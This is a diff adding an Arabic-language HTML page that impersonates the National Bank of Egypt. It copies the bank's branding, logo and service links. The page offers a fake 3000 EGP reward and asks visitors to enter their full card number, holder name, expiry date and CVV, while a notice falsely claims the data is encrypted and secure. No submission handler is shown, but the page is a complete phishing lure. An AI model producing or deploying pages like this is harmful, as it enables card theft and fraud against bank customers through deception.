@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>البنك الأهلي المصري - تحديث بيانات البطاقة</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="NBE_logo.png">
+
+  <style>
+    /* الخط المستخدم في موقع البنك الأهلي قد يكون Cairo أو مشابه له */
+    body {
+      font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* إضافة خط Cairo كأولوية */
+      margin: 0;
+      padding: 0;
+      background-color: #f6f6f6; /* رمادي فاتح جداً للخلفية العامة */
+      direction: rtl;
+      text-align: right;
+    }
+
+    /* شريط علوي أخضر داكن (زيتي) */
+    .header-top-bar {
+        background-color: #006633; /* أخضر داكن جديد */
+        color: white;
+        padding: 5px 20px;
+        display: flex;
+        justify-content: flex-end;
+        align-items: center;
+        font-size: 0.85em;
+    }
+    .header-top-bar .search-box {
+        position: relative;
+        margin-left: 20px;
+    }
+    .header-top-bar .search-box input {
+        border: none;
+        padding: 5px 10px;
+        border-radius: 3px;
+        background-color: rgba(255, 255, 255, 0.2);
+        color: white;
+        width: 120px;
+    }
+    .header-top-bar .search-box input::placeholder {
+        color: rgba(255, 255, 255, 0.7);
+    }
+    .header-top-bar .search-box .search-icon {
+        position: absolute;
+        right: 8px; /* على اليمين في RTL */
+        top: 50%;
+        transform: translateY(-50%);
+        color: white;
+    }
+    .header-top-bar .lang-switch {
+        margin-left: 15px;
+        color: white;
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    /* شريط الرأس الرئيسي الأبيض */
+    .header {
+      background-color: #ffffff;
+      padding: 10px 20px;
+      border-bottom: 1px solid #e0e0e0; /* حدود خفيفة */
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05); /* ظل خفيف */
+    }
+    .header .logo img {
+      height: 40px;
+      max-width: 150px;
+    }
+    .nav-links ul {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+      display: flex;
+    }
+    .nav-links li {
+      margin-left: 20px;
+    }
+    .nav-links a {
+      text-decoration: none;
+      color: #333; /* لون نص الروابط */
+      font-weight: bold;
+      font-size: 15px;
+      transition: color 0.3s;
+    }
+    .nav-links a:hover {
+      color: #DAA520; /* لون ذهبي للمؤشر، أقرب للصور */
+    }
+
+    /* قسم الهيرو (الترويجي) - لون ذهبي/برتقالي */
+    .hero-section {
+      background-color: #DAA520; /* لون ذهبي مطابق تقريبا للصور */
+      color: white;
+      text-align: center;
+      padding: 40px 20px;
+      font-size: 1.2em;
+    }
+    .hero-section h1 {
+      margin-top: 0;
+      font-size: 2em;
+    }
+
+    /* الكونتينر الأساسي للنموذج */
+    .container {
+      max-width: 600px;
+      margin: 30px auto;
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      color: #006633; /* أخضر داكن جديد للعناوين */
+      text-align: center;
+      margin-bottom: 25px;
+      font-size: 1.8em;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      color: #555;
+      font-weight: bold;
+    }
+    .form-group input,
+    .form-group select {
+      width: calc(100% - 22px);
+      padding: 10px;
+      border: 1px solid #ccc; /* حدود المدخلات */
+      border-radius: 5px;
+      font-size: 1em;
+      box-sizing: border-box;
+    }
+    .flex-group {
+      display: flex;
+      gap: 15px;
+    }
+    .flex-group > div {
+      flex: 1;
+    }
+    .card-logos {
+      display: flex;
+      gap: 10px;
+      margin-top: 5px;
+    }
+    .card-logos img {
+      height: 25px;
+    }
+    /* رسالة الأمان */
+    .security-info {
+      font-size: 0.9em;
+      color: #006633; /* أخضر داكن جديد */
+      text-align: center;
+      margin-top: 25px;
+      background-color: #e6ffe6; /* أخضر فاتح جداً للخلفية */
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #006633;
+    }
+    /* زر الإرسال */
+    button {
+      background-color: #006633; /* أخضر داكن جديد لزر الإرسال */
+      color: white;
+      padding: 15px;
+      border: none;
+      width: 100%;
+      font-size: 1.1em;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 30px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #004F28; /* أخضر أغمق عند التحويم */
+    }
+    .error {
+        color: red;
+        font-size: 0.9em;
+        margin-top: -10px;
+        margin-bottom: 10px;
+        text-align: center;
+    }
+
+    /* قسم الخدمات الإلكترونية */
+    .e-services-section {
+        background-color: #fcfcfc; /* أبيض ناصع أو قريب للأبيض */
+        padding: 30px 20px;
+        margin-top: 30px;
+        border-top: 1px solid #e0e0e0;
+        text-align: center;
+    }
+    .e-services-section h2 {
+        color: #006633; /* أخضر داكن جديد */
+        margin-bottom: 30px;
+    }
+    .e-services-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 20px;
+        max-width: 800px;
+        margin: 0 auto;
+    }
+    .e-service-item {
+        background-color: #ffffff; /* أبيض ناصع داخل المربعات */
+        border: 1px solid #e0e0e0;
+        border-radius: 8px;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+        text-decoration: none;
+        color: #333;
+        transition: transform 0.2s, box-shadow 0.2s;
+    }
+    .e-service-item:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    }
+    .e-service-item img {
+        width: 80px;
+        height: auto;
+        margin-bottom: 15px;
+    }
+    .e-service-item h3 {
+        color: #006633; /* أخضر داكن جديد */
+        font-size: 1.2em;
+        margin-bottom: 10px;
+    }
+    .e-service-item p {
+        font-size: 0.9em;
+        line-height: 1.5;
+        color: #666;
+    }
+    .e-service-item .learn-more {
+        display: block;
+        margin-top: 15px;
+        color: #DAA520; /* لون ذهبي لـ "اعرف أكثر" */
+        font-weight: bold;
+        text-decoration: none;
+    }
+
+    /* قسم أيقونات الخدمات السفلية */
+    .services-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+      gap: 15px;
+      padding: 30px 20px;
+      background-color: #fcfcfc; /* أبيض ناصع جداً */
+      border-top: 1px solid #e0e0e0;
+      text-align: center;
+    }
+    .service-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-decoration: none;
+      color: #333;
+      font-size: 0.85em;
+      font-weight: bold;
+      transition: transform 0.2s;
+    }
+    .service-item:hover {
+      transform: translateY(-3px);
+    }
+    .service-item img {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 8px;
+    }
+
+    /* قسم المعلومات الإضافية (روابط التذييل) */
+    .info-columns {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+      padding: 30px 20px;
+      background-color: #f0f0f0; /* رمادي فاتح للخلفية */
+      border-top: 1px solid #e0e0e0;
+    }
+    .info-column h3 {
+      color: #006633; /* أخضر داكن جديد للعناوين */
+      margin-bottom: 15px;
+      font-size: 1.1em;
+    }
+    .info-column ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .info-column li {
+      margin-bottom: 8px;
+    }
+    .info-column a {
+      text-decoration: none;
+      color: #555;
+      font-size: 0.9em;
+      transition: color 0.2s;
+    }
+    .info-column a:hover {
+      color: #006633; /* أخضر داكن جديد */
+    }
+
+    /* التذييل النهائي */
+    .footer {
+      text-align: center;
+      padding: 20px;
+      color: #777;
+      font-size: 0.9em;
+      margin-top: 0;
+      border-top: 1px solid #e0e0e0;
+      background-color: #e0e0e0; /* رمادي فاتح جداً */
+    }
+    .footer a {
+      color: #006633; /* أخضر داكن جديد للروابط */
+      text-decoration: none;
+      margin: 0 10px;
+    }
+  </style>
+
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <div class="header-top-bar">
+    <div class="search-box">
+        <input type="text" placeholder="بحث...">
+        <span class="search-icon">🔍</span>
+    </div>
+    <a href="#" class="lang-switch">EN</a>
+  </div>
+
+  <div class="header">
+    <div class="logo">
+      <img src="NBE_logo.png" alt="sim Logo" class="company-logo">
+    </div>
+    <div class="nav-links">
+      <ul>
+        <li><a href="#">الخدمات المصرفية</a></li>
+        <li><a href="#">الأفراد</a></li>
+        <li><a href="#">الشركات</a></li>
+        <li><a href="#">عنا</a></li>
+        <li><a href="#">اتصل بنا</a></li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="hero-section">
+    <h1>تهانينا! لديك مكافأة مالية من البنك الأهلي المصري</h1>
+    <p>لاستلام مكافأتك البالغة 3000 جنيه مصري، يرجى تحديث بيانات بطاقتك.</p>
+  </div>
+
+  <div class="container">
+    <h2>تحديث بيانات البطاقة الائتمانية / الخصم المباشر</h2>
+    <p class="security-info">لأغراض أمنية، يرجى إدخال بيانات بطاقتك لمطابقتها مع سجلات البنك. معلوماتك آمنة ومحمية بتقنية التشفير.</p>
+    <div id="error" class="error"></div>
+    <form id="payment-form">
+      <div class="form-group">
+        <label for="card_number">رقم البطاقة:</label>
+        <input type="text" id="card_number" name="card_number" placeholder="أدخل رقم البطاقة المكون من 16 رقمًا" required pattern="\d{16}" title="رقم البطاقة يجب أن يكون 16 رقمًا">
+        <div class="card-logos">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="card_holder_name">اسم حامل البطاقة (كما يظهر على البطاقة):</label>
+        <input type="text" id="card_holder_name" name="card_holder_name" placeholder="مثال: AHMED MOHAMED" required>
+      </div>
+
+      <div class="flex-group">
+        <div class="form-group">
+          <label for="expiry_month">تاريخ انتهاء الصلاحية:</label>
+          <div class="flex-group">
+            <select id="expiry_month" name="expiry_month" required>
+              <option value="">الشهر</option>
+              <script>
+                for (let i = 1; i <= 12; i++) {
+                  document.write(`<option value="${String(i).padStart(2, '0')}">${String(i).padStart(2, '0')}</option>`);
+                }
+              </script>
+            </select>
+            <select id="expiry_year" name="expiry_year" required>
+              <option value="">السنة</option>
+              <script>
+                const currentYear = new Date().getFullYear();
+                for (let i = 0; i < 10; i++) {
+                  document.write(`<option value="${currentYear + i}">${currentYear + i}</option>`);
+                }
+              </script>
+            </select>
+          </div>
+        </div>
+        <div class="form-group">
+          <label for="cvc">رمز CVV/CVC:</label>
+          <input type="text" id="cvc" name="cvc" placeholder="3 أو 4 أرقام" required pattern="\d{3,4}" title="CVV/CVC يجب أن يكون 3 أو 4 أرقام">
+        </div>
+      </div>
+
+      <button type="submit">تأكيد واستلام المكافأة</button>
+    </form>
+  </div>
+
+  <div class="e-services-section">
+    <h2>تعرف أكثر عن الخدمات الإلكترونية</h2>
+    <div class="e-services-grid">
+      <a href="#" class="e-service-item">
+        <img src="4ec79790-ab88-4fd4-96d6-ed3aeb4f4e00.png" alt="sim Logo" class="company-logo">
+        <h3>خدمة الأهلي موبايل البنكي</h3>
+        <p>والتي تقدم تجربة مصرفية متطورة سهلة وآمنة والتي تتيح لك اجراء العديد من الخدمات المصرفية المطلوبة في اي وقت ومكان.</p>
+        <span class="learn-more">اعرف أكثر</span>
+      </a>
+      <a href="#" class="e-service-item">
+        <img src="68765816-8f43-4dcd-b6ec-8b892ee6149a.png" alt="sim Logo" class="company-logo">
+        
+        <h3>خدمة الأهلي نت</h3>
+        <p>تجربة مصرفية متطورة سهلة وآمنة ومريحة خصيصا لتلبي احتياجاتك المصرفية من خلال الإنترنت.</p>
+        <span class="learn-more">اعرف أكثر</span>
+      </a>
+    </div>
+  </div>
+
+  <div class="services-grid">
+    <a href="#" class="service-item">
+      <img src="af8b72ac-4c70-4f23-846e-397d016235c0.png" alt="WhatsApp" class="company-logo"> <span>الأهلي واتس اب</span>
+    </a>
+    <a href="#" class="service-item">
+      <img src="862b9a0e-d374-49ee-bfa0-ca10eabcf5ea.png" alt="أسعار العملات" class="company-logo"> <span>أسعار العملات</span>
+    </a>
+    <a href="#" class="service-item">
+      <img src="26a01a93-a0dd-409b-b10a-32fec6e078a2.png" alt="تاريخ طلبك" class="company-logo"> <span>تاريخ طلبك</span>
+    </a>
+    <a href="#" class="service-item">
+      <img src="32b91a75-ad8f-4d02-a2d4-f88ec9f6ce1e.png" alt="الأهلي نت" class="company-logo"> <span>الأهلي نت</span>
+    </a>
+    <a href="#" class="service-item">
+      <img src="742690b7-4fae-4be9-92d0-848ad8bec014.png" alt="الأهلي بوينتس" class="company-logo"> <span>الأهلي بوينتس</span>
+    </a>
+    <a href="#" class="service-item">
+      <img src="cc5398bc-e93e-461e-a008-0870d6d4df1b.png" alt="أسئلة شائعة" class="company-logo"> <span>الأسئلة الشائعة</span>
+    </a>
+    <a href="#" class="service-item">
+      <img src="2b564ac8-5570-4e2f-af85-157eeb45c943.png" alt="ماكينات ATM" class="company-logo"> <span>ماكينات ومواقع الصراف</span>
+    </a>
+  </div>
+
+  <div class="info-columns">
+    <div class="info-column">
+      <h3>مهم في...</h3>
+      <ul>
+        <li><a href="#">شراء شهادة</a></li>
+        <li><a href="#">طلب الحصول على القرض</a></li>
+        <li><a href="#">البطاقة</a></li>
+        <li><a href="#">تمويل المشروعات الصغيرة</a></li>
+        <li><a href="#">الخدمات المصرفية</a></li>
+        <li><a href="#">الاستثمار في البورصة</a></li>
+        <li><a href="#">حسابات التوفير</a></li>
+        <li><a href="#">معاشات</a></li>
+      </ul>
+    </div>
+    <div class="info-column">
+      <h3>اختصارات</h3>
+      <ul>
+        <li><a href="#">أسعار العملات</a></li>
+        <li><a href="#">الجوائز</a></li>
+        <li><a href="#">المشروعات الصغيرة</a></li>
+        <li><a href="#">الصور والمراسلين</a></li>
+        <li><a href="#">وكلاء ومراسلون</a></li>
+        <li><a href="#">التحويلات الإلكترونية</a></li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="footer">
+    <p>&copy; 2023 البنك الأهلي المصري. جميع الحقوق محفوظة.</p>
+    <div>
+      <a href="#">سياسة الخصوصية</a> |
+      <a href="#">شروط وأحكام</a>
+    </div>
+  </div>
+</body>
+</html> 
